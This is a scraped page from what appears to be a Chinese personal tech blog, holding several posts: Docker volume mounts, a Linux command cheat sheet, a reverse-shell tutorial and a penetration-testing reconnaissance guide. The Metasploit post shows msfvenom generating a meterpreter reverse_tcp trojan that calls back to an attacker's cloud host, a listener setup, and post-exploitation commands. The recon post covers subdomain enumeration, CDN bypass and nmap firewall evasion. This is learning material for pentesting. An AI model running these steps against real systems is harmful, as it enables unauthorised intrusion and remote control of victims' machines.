bd_build  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到宿主机文件夹mnt</p><p><img src="/2020/09/28/docker-guide/1603765650364.png" alt="1603765650364"></p><h3 id="挂载两个目录"><a href="#挂载两个目录" class="headerlink" title="挂载两个目录"></a>挂载两个目录</h3><p>注意每个目录前都要加参数-v</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> -v <span class="token variable">$path1_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path1_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><span class="post-count">总字数593</span> <span class="post-count">预计阅读2分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-linux-cmd" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2020/09/28/linux-cmd/" class="article-date"><time class="published" datetime="2020-09-28T07:22:20.000Z" itemprop="datePublished">2020-09-28 发布</time> <time class="updated" datetime="2021-01-20T07:41:57.327Z" itemprop="dateUpdated">2021-01-20 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2020/09/28/linux-cmd/">linux命令大全</a></h1></header><div class="article-entry" itemprop="articleBody"><h4 id="重命名："><a href="#重命名：" class="headerlink" title="重命名："></a>重命名：</h4><pre><code>原字符串：将文件名需要替换的字符串；
目标字符串：将文件名中含有的原字符替换成目标字符串；
文件：指定要改变文件名的文件列表。</code></pre><pre><code>rename main1.c main.c main1.c</code></pre><h4 id="复制文件："><a href="#复制文件：" class="headerlink" title="复制文件："></a>复制文件：</h4><pre><code> cp -i file1 dir1</code></pre><h4 id="linux-查看进程"><a href="#linux-查看进程" class="headerlink" title="linux 查看进程"></a>linux 查看进程</h4><p>ps -ef/ ps -aux</p><p>[root@ids0001 logstash]# ps -ef |grep logstash</p><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><p>kill 1827</p><p>kill -9 1827</p><h4 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h4><pre><code>free -m</code></pre><h4 id="查看进程所用内存"><a href="#查看进程所用内存" class="headerlink" title="查看进程所用内存"></a>查看进程所用内存</h4><pre><code>top
然后按M进行排序</code></pre><h4 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h4><pre><code>sudo nohup cmd </code></pre><p>sudo nohup /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf &amp;</p><h4 id="inotify命令"><a href="#inotify命令" class="headerlink" title="inotify命令"></a><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1417976">inotify命令</a></h4><p>功能：监控某个目录的文件是否发生变化执行相应脚本</p><p>（0）首先查看系统内核是否支持inotify功能 ls -l /proc/sys/fs/inotify，出现如下内容说明支持：</p><pre class="line-numbers language-bash"><code class="language-bash">total 0
-rw-r--r-- 1 root root 0 Apr 23 15:23 max_queued_events
-rw-r--r-- 1 root root 0 Apr 24 22:11 max_user_instances
-rw-r--r-- 1 root root 0 Apr 23 15:23 max_user_watches<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或通过 uname -a 查看当前系统内核版本是否在2.6.13 以上：</p><pre class="line-numbers language-bash"><code class="language-bash">Linux VM_3_105_centos 3.10.107 x86_64 GNU/Linux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（1）查看是否安装</p><pre class="line-numbers language-bash"><code class="language-bash">rpm -qa inotify-tools <span class="token comment" spellcheck="true">#如果没安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有回显则没有安装</p><p>（2）安装inotify</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo
yum <span class="token function">install</span> inotify-tools -y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/28/linux-cmd/1604557978079.png" alt="1604557978079"></p><p>(3) 查看版本</p><p><img src="/2020/09/28/linux-cmd/1604558015626.png" alt="1604558015626"></p><p>(4)使用教程</p><p>1）创建执行脚本：inotifytest.sh脚本：监控/root/testdir目录，输出目录的CRUD变化。<a target="_blank" rel="noopener" href="https://blog.csdn.net/zzmfish/article/details/48787355?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">参考使用inotifywait同步修改的文件到服务器</a>。</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bash
#监视目录和目标目录
FROM_DIR="/root/testdir"
#inotifywait -m -r --timefmt "%F %T" --format "%e %w %f" -o /var/log/change.log $FROM_DIR
inotifywait -m --format "%e %w %f" $FROM_DIR | while read eventName dirName fileName; do
    #显示事件
    echo "-- Event:$eventName Dir:$dirName File:$fileName"
    #忽略“.”开头和“_”结束的文件
    if [[ $fileName == .* ]] || [[ $fileName == *_ ]]; then
        continue
    fi
    #复制改动的文件（有些IDE会在临时文件编辑，保存时同够移动覆盖原文件）
    case $eventName in
    CREATE)
        echo "create $fileName"
        sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/$&#123;$fileName&#125; -l  /var/log/suricata/cap
        #cp -v $&#123;dirName&#125;$&#123;fileName&#125; $TO_DIR/$dirName
    esac
done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）执行监听脚本</p><pre><code>./inotifytest.sh#启动监听脚本，观察文件夹内的变化</code></pre><p><img src="/2020/09/28/linux-cmd/1604562579710.png" alt="1604562579710"></p><p>执行下面脚本，在文件夹内新增文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
int<span class="token operator">=</span>1
<span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span> $int<span class="token operator">&lt;=</span><span class="token number">10</span> <span class="token punctuation">))</span></span>
do+
    <span class="token keyword">echo</span> <span class="token variable">$int</span>
    <span class="token function">cp</span> /tmp/test.cap /root/testdir/$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;int&amp;#125;.cap</span>
    <span class="token keyword">let</span> <span class="token string">"int++"</span>
<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="crontab定时"><a href="#crontab定时" class="headerlink" title="crontab定时"></a>crontab定时</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wenzheshen/p/8432588.html">https://www.cnblogs.com/wenzheshen/p/8432588.html</a></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ithomer/article/details/6817019">https://blog.csdn.net/ithomer/article/details/6817019</a></p><p><a target="_blank" rel="noopener" href="https://www.jellythink.com/archives/155">https://www.jellythink.com/archives/155</a></p><p>新建脚本time.sh 内容如下，防止suricata执行时间过长，有些文件没有执行到就被删除了</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token function">cp</span> -Rf /root/testdir/ /root/temp/
<span class="token function">rm</span> -rf /root/testdir/*
suricata -c /etc/suricata/suricata.yaml -r /root/temp/
<span class="token function">rm</span> -rf /root/temp/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在终端输入以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在显示的文件末尾添加以下规则：#每5分钟运行一次time.sh脚本,并把错误和正确的日志都存到/tmp/load.log上。</p><pre class="line-numbers language-bash"><code class="language-bash">*/5 * * * * /root/time.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑完成，保存完成以后，就会显示以下提示信息：</p><pre class="line-numbers language-bash"><code class="language-bash">crontab: installing new <span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就说明正在安装新的定时任务，如果没有这条提示信息，请重新运行<code>crontab -e</code>命令。</p><p><img src="/2020/09/28/linux-cmd/1604578836302.png" alt="1604578836302"></p><p>每一分钟请求一个地址</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e
*/1 * * * *  /usr/bin/curl https://www.baidu.com/ <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.将正确和错误日志都输出到 /tmp/load.log</p><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * /root/XXXX.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除rm"><a href="#删除rm" class="headerlink" title="删除rm"></a>删除rm</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> -Rf /home/user1/* /root/temp/
将 /home/user1目录下的所有东西拷到/root/temp/下而不拷贝user1目录本身。
即格式为：cp -Rf 原路径/ 目的路径/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><span class="post-count">总字数877</span> <span class="post-count">预计阅读4分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-pt-metosploitInAliyun" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2020/09/28/pt-metosploitInAliyun/" class="article-date"><time class="published" datetime="2020-09-28T07:22:20.000Z" itemprop="datePublished">2020-09-28 发布</time> <time class="updated" datetime="2021-02-18T07:04:54.436Z" itemprop="dateUpdated">2021-02-18 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2020/09/28/pt-metosploitInAliyun/">在阿里云主机反弹metosploit</a></h1></header><div class="article-entry" itemprop="articleBody"><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>一般反弹shell，需要一个公网Ip的机器，这里我们选择阿里云主机，因为阿里云主机默认是只开放了固定端口，因此我们想要对某个端口监听的，首先需要开起阿里云的具体端口，这里我们选择7777作为监听端口，具体配置如下图所示。这里还应该注意的是阿里云主机有两个IP，一个是公网IP，另外一个是内网IP，具体用法下面会说到。</p><p>利用阿里云作为反弹主机，因为阿里云主机默认是将端口关闭的，因此首先需要允许对应端口开放，这里我选择的是7777，具体配置如下图所示。需要注意的是，阿里主机有两个IP，一个为公网IP，一个为内网IP，这两个IP后面会说到。</p><p><img src="/2020/09/28/pt-metosploitInAliyun/1602814914926.png" alt="1602814914926"></p><h2 id="反弹shell步骤"><a href="#反弹shell步骤" class="headerlink" title="反弹shell步骤"></a>反弹shell步骤</h2><p>步骤如下：</p><p>1）生成载荷/木马，注意这里用的是阿里云公网IP（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LyShark/p/12189163.html">生成各种载荷</a>）</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=阿里云公网IP lport=7777 -f exe &gt; load.exe</code></pre><p>2） 阿里云主机开始监听</p><pre><code>msfconsle #打开msf
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp #注意这里的载荷要和生成木马对应的载荷相同
options #查看选项
set LHOST 阿里云内网IP #设置监听IP
set LPORT 7777  #设置监听端口
run/exploit#开始监听</code></pre><p>3)目标主机执行载荷/木马</p><p>双击Exe，如果是linux下，生成的elf木马</p><pre><code>chmod muma.elf#赋可执行权限
./muma.elf #执行木马</code></pre><p>4）观察阿里云主机是否连接成功，如下图表示连接成功</p><p><img src="/2020/09/28/pt-metosploitInAliyun/1610957093533.png" alt="1610958466075"></p><p>5）连接成功后，meterpreter常用命令如下。</p><p><strong>基本命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash">background  <span class="token comment" spellcheck="true"># 让meterpreter处于后台模式  </span>
sessions -i index   <span class="token comment" spellcheck="true"># 与会话进行交互，index表示第一个session  </span>
quit  <span class="token comment" spellcheck="true"># 退出会话  </span>
shell <span class="token comment" spellcheck="true"># 获得控制台权限  </span>
irb <span class="token comment" spellcheck="true"># 开启ruby终端</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>文件系统命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token comment" spellcheck="true"># 查看文件内容  </span>
getwd <span class="token comment" spellcheck="true"># 查看当前工作目录  </span>
upload  <span class="token comment" spellcheck="true"># 上传文件到目标机上  </span>
download <span class="token comment" spellcheck="true"># 下载文件到本机上  </span>
edit <span class="token comment" spellcheck="true"># 编辑文件  </span>
search  <span class="token comment" spellcheck="true"># 搜索文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>网络命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash">ipconfig / <span class="token function">ifconfig</span> <span class="token comment" spellcheck="true"># 查看网络接口信息  </span>
portfwd  add -l 4444 -p 3389 -r 192.168.1.102 <span class="token comment" spellcheck="true"># 端口转发，本机监听4444，把目标机3389转到本机4444 </span>
rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 <span class="token comment" spellcheck="true">#然后使用rdesktop来连接，-u 用户名 -p 密码</span>
route <span class="token comment" spellcheck="true"># 获取路由表信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>系统命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> <span class="token comment" spellcheck="true"># 查看当前活跃进程 </span>
migrate pid <span class="token comment" spellcheck="true"># 将Meterpreter会话移植到进程数位pid的进程中 </span>
execute -H -i -f cmd.exe <span class="token comment" spellcheck="true"># 创建新进程cmd.exe，-H不可见，-i交互 </span>
getpid <span class="token comment" spellcheck="true"># 获取当前进程的pid </span>
<span class="token function">kill</span> pid <span class="token comment" spellcheck="true"># 杀死进程 </span>
getuid <span class="token comment" spellcheck="true"># 查看权限 </span>
sysinfo <span class="token comment" spellcheck="true"># 查看目标机系统信息，如机器名，操作系统等 </span>
<span class="token function">shutdown</span> <span class="token comment" spellcheck="true"># 关机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="REF："><a href="#REF：" class="headerlink" title="REF："></a>REF：</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/29/">meterpreter相关教程包括后渗透攻击</a></p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LyShark/p/12189163.html">Metasploit 生成各种攻击载荷</a></p><p><a target="_blank" rel="noopener" href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/">各种姿势反弹shell</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul></div><span class="post-count">总字数733</span> <span class="post-count">预计阅读2分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-pt-info-collection" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2020/09/28/pt-info-collection/" class="article-date"><time class="published" datetime="2020-09-28T03:14:51.000Z" itemprop="datePublished">2020-09-28 发布</time> <time class="updated" datetime="2021-02-18T08:46:17.994Z" itemprop="dateUpdated">2021-02-18 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2020/09/28/pt-info-collection/">信息收集</a></h1></header><div class="article-entry" itemprop="articleBody"><p>江湖上流传着这样一句话，渗透测试的本质就是信息收集，一次成功的渗入，百分之80的时间都花在了信息收集上，信息收集真的这么重要么？那么具体要收集什么信息呢？</p><p>信息收集主要是收集服务器的配置信息和网站的敏感信息，主要包括域名信息、子域名信息、目标网站信息、目标网站真实IP、目录文件、开放端口和服务、中间件信息、脚本语言等等等。 <strong>汇总图如下？？？</strong></p><p><strong>在进行信息收集的时候，我们既要全面详细的获取目标的信息，又要尽量隐藏自己不被发现。尽量用网络搜集，用工具收集时适当挂代理</strong>。因此主要从网络搜集和工具搜集两种方式去逐个介绍。</p><h1 id="1-域名信息"><a href="#1-域名信息" class="headerlink" title="1 域名信息"></a>1 域名信息</h1><p>域名信息：whois信息，备案信息</p><h2 id="1-1-whois信息"><a href="#1-1-whois信息" class="headerlink" title="1.1 whois信息"></a>1.1 whois信息</h2><p>关注的重点是注册商、注册人、邮件、DNS解析服务器、注册人联系电话。</p><p>Kali的查询：whois -h 注册服务器地址 域名 .例如：whoid freebuf.com</p><p>站长工具-站长之家域名WHOIS信息查询地址：<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站网域名WHOIS信息查询地址：<a target="_blank" rel="noopener" href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>腾讯云域名WHOIS信息查询地址：<a target="_blank" rel="noopener" href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>国外的who.is：<a target="_blank" rel="noopener" href="https://who.is/">https://who.is/</a></p><p>微步：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p>Virus Total:<a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p><img src="/2020/09/28/pt-info-collection/1599205057130.png" alt="1599205057130"></p><h2 id="1-2-备案信息"><a href="#1-2-备案信息" class="headerlink" title="1.2 备案信息"></a>1.2 备案信息</h2><p>备案查询我们主要关注的是：单位信息例如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。</p><p>常见查询备案信息的网站如下：</p><p>天眼查：<a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>ICP备案查询网：<a target="_blank" rel="noopener" href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></p><p>国家企业信用信息公示系统：<a target="_blank" rel="noopener" href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a></p><p>爱站的备案查询：<a target="_blank" rel="noopener" href="https://icp.aizhan.com/">https://icp.aizhan.com</a></p><p><img src="/2020/09/28/pt-info-collection/1599205081019.png" alt="1599205081019"></p><h1 id="2-子域名收集"><a href="#2-子域名收集" class="headerlink" title="2 子域名收集"></a>2 子域名收集</h1><p>子域名也就是二级域名，是指顶级域名下的域名。收集的子域名越多，我们测试的目标就越多，目标系统渗透成功的机率也越大。主站无懈可击的时候子域名是一个很好的突破口。</p><h2 id="2-1-网络搜索"><a href="#2-1-网络搜索" class="headerlink" title="2.1  网络搜索"></a>2.1 网络搜索</h2><h2 id="2-1-1-搜索引擎"><a href="#2-1-1-搜索引擎" class="headerlink" title="2.1.1 搜索引擎"></a>2.1.1 搜索引擎</h2><p>可以利用Google、Bing 、shodan和百度这样的搜索引擎进行搜索查询 ，要掌握黑客语法，具体如下：</p><p>Google搜索语法：<a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/08/15/5d55112f06e84/">https://www.dazhuanlan.com/2019/08/15/5d55112f06e84/</a></p><p>Bing搜索语法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hansel/article/details/53886828">https://blog.csdn.net/hansel/article/details/53886828</a></p><p>百度搜索语法：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a></p><p>搜索实例：</p><p><img src="/2020/09/28/pt-info-collection/1599205666073.png" alt="1599205666073"></p><h2 id="2-1-2-在线网站"><a href="#2-1-2-在线网站" class="headerlink" title="2.1.2 在线网站"></a>2.1.2 在线网站</h2><p>（1）<a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p>（2）<a target="_blank" rel="noopener" href="http://i.links.cn/subdomain/%EF%BC%88">http://i.links.cn/subdomain/（</a></p><p>（3）<a target="_blank" rel="noopener" href="http://dns.aizhan.com/">http://dns.aizhan.com</a></p><p>（4）<a target="_blank" rel="noopener" href="http://z.zcjun.com/%EF%BC%88%E5%93%8D%E5%BA%94%E5%BE%88%E5%BF%AB,%E6%8E%A8%E8%8D%90%EF%BC%89">http://z.zcjun.com/（响应很快,推荐）</a></p><p>（5）Github搜索子域名</p><p><img src="/2020/09/28/pt-info-collection/1599206150013.png" alt="1599206150013"></p><h2 id="2-2-工具搜集"><a href="#2-2-工具搜集" class="headerlink" title="2.2 工具搜集"></a>2.2 工具搜集</h2><p>检测工具有很多，但重要的是需要日常完善字典，字典强大才是硬道理。常见的有</p><p>layer子域名挖掘机、Sublist3r、subDomainsBrute、K8、orangescan、DNSRecon、dnsmaper、wydomain等等，重点推荐layer子域名挖掘机（使用简单，界面细致）、Sublist3r（列举多资源下查到的域名）和subDomainsBrute。（递归查询多级域名），此类工具github都有下载地址和使用方法。</p><p>链接如下：</p><p>SubDomainBrute：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><p>Sublist3r：<a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p><p>Layer（5.0增强版）：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q">https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q</a> 密码:aup5</p><p><a target="_blank" rel="noopener" href="https://d.chinacycc.com/">https://d.chinacycc.com</a>（大佬推荐的说好用的很，但是收费。）</p><h1 id="3-真实IP收集"><a href="#3-真实IP收集" class="headerlink" title="3 真实IP收集"></a>3 真实IP收集</h1><p>信息收集工程中IP地址是必不可少的，在域名收集工程中我们已经对ip段收集，whois、ping测试、指纹网站都可以探测ip地址，但是很多目标服务器存在CDN，那什么是CDN，如果饶过查找真实IP呢？</p><p>CDN的全称是Content Delivery Network，即<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，只有在实际数据交互时才会从远程web服务器响应，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><h2 id="3-1-绕过cdn"><a href="#3-1-绕过cdn" class="headerlink" title="3.1 绕过cdn"></a>3.1 绕过cdn</h2><p><strong>3.1.1 确定有无cdn</strong></p><p>（1）很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a target="_blank" rel="noopener" href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p><p>(2)使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p><p><strong>3.1.2 绕过cdn</strong></p><h2 id="3-2-c段，旁站ip"><a href="#3-2-c段，旁站ip" class="headerlink" title="3.2 c段，旁站ip"></a>3.2 c段，旁站ip</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。</p><p>C端：是和目标服务器ip处在同一个C段的其它服务器。</p><h3 id="3-2-1-网站扫描"><a href="#3-2-1-网站扫描" class="headerlink" title="3.2.1 网站扫描"></a>3.2.1 网站扫描</h3><p><a target="_blank" rel="noopener" href="http://www.webscan.cc/">http://www.webscan.cc/</a></p><p><a target="_blank" rel="noopener" href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a></p><p><a target="_blank" rel="noopener" href="https://phpinfo.me/bing.php%EF%BC%88%E5%8F%AF%E8%83%BD%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%EF%BC%89">https://phpinfo.me/bing.php（可能访问不了）</a></p><h3 id="3-2-2-工具"><a href="#3-2-2-工具" class="headerlink" title="3.2.2 工具"></a>3.2.2 工具</h3><p>神器 ： <a target="_blank" rel="noopener" href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p>御剑1.5：<strong><a target="_blank" rel="noopener" href="https://download.csdn.net/download/peng119925/10722958">https://download.csdn.net/download/peng119925/10722958</a></strong></p><p>C端查询：IIS PUT Scanner（扫描速度快，自定义端口，有banner信息）</p><p>Nmap：语法：nmap -p 80,8080 –open ip/24</p><h1 id="4-端口信息"><a href="#4-端口信息" class="headerlink" title="4 端口信息"></a>4 端口信息</h1><p>对网站域名对应的真实IP地址进行端口测试，很多有防护不能大批量扫描和漏洞测试。</p><h2 id="4-1-网站"><a href="#4-1-网站" class="headerlink" title="4.1 网站"></a>4.1 网站</h2><p><a target="_blank" rel="noopener" href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p><a target="_blank" rel="noopener" href="https://tool.lu/portscan/index.html">https://tool.lu/portscan/index.html</a></p><h2 id="4-2-工具"><a href="#4-2-工具" class="headerlink" title="4.2 工具"></a>4.2 工具</h2><p>常见工具就是nmap(功能强大)、masscan、zmap和御剑tcp端口高速扫描工具(较快)。</p><p>扫描思路：我们可以在收集子域对应的的ip后整理到txt中，然后nmap批量端口扫描、服务爆破和漏洞扫描，前提是不被封禁IP，可采用代理池。</p><p>nmap -iL ip.txt –script=auth,vuln &gt; finalscan.txt 扫描导出常见端口和漏洞。</p><p>常见端口说明和攻击方向整理如下：<a href="https://m01ly.github.io/2020/09/04/pt-portinfo/">https://m01ly.github.io/2020/09/04/pt-portinfo/</a></p><pre><code> nmap 10.0.1.161  -p 1-65535 </code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap 过防火墙参数：
-mtu 数据包最大传输单元
--data-length 设置数据包的长度
--scan-delay  延迟一定的时间发包，主要用于绕过频率的限制
--randomize-hosts 对批量目标随机IP进行扫描，适合批量目标一起扫的情况<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大部分情况下使用上面的参数或者多个参数进行组合即可绕过防火墙进行扫描。</p><h1 id="5-网站信息收集"><a href="#5-网站信息收集" class="headerlink" title="5  网站信息收集"></a>5 网站信息收集</h1><p>网站信息信息收集主要是：操作系统，中间件，脚本语言，数据库，服务器，web容器、waf、cdn、cms、历史漏洞、dns区域传送等，可以使用以下方法查询。</p><p>常见指纹工具：御剑web指纹识别、轻量级web指纹识别、whatweb等</p><h2 id="5-1-web指纹"><a href="#5-1-web指纹" class="headerlink" title="5.1 web指纹"></a>5.1 web指纹</h2><p>web指纹：操作系统，框架，脚本语言，web容器，服务器，数据库，版本号等</p><p>潮汐指纹：<a target="_blank" rel="noopener" href="http://finger.tidesec.net/%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89">http://finger.tidesec.net/（推荐）</a></p><p>云悉(现在需要邀请码)：<a target="_blank" rel="noopener" href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a></p><p>CMS指纹识别：<a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><h2 id="5-2-Waf-识别"><a href="#5-2-Waf-识别" class="headerlink" title="5.2 Waf 识别"></a>5.2 Waf 识别</h2><h3 id="5-2-1-wafw00f"><a href="#5-2-1-wafw00f" class="headerlink" title="5.2.1 wafw00f"></a>5.2.1 wafw00f</h3><p>kali上自带wafw00f，一条命令直接使用。建议最好在kali下使用，windows下的使用很麻烦。Nmap上也包含识别waf指纹的脚本模块。</p><p>下载地址： <a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>WAFW00F探测WAF</p><pre><code>命令：wafw00f  -a  域名</code></pre><h3 id="5-2-2-nmap"><a href="#5-2-2-nmap" class="headerlink" title="5.2.2 nmap"></a>5.2.2 nmap</h3><p>Nmap探测WAF有两种脚本。</p><p>一种是http-waf-detect。</p><pre><code>命令：nmap  -p80,443  --script=http-waf-detect  ip</code></pre><p>一种是http-waf-fingerprint。</p><pre><code>命令：nmap  -p80,443  --script=http-waf-fingerprint  ip</code></pre><h1 id="6-敏感目录文件收集"><a href="#6-敏感目录文件收集" class="headerlink" title="6 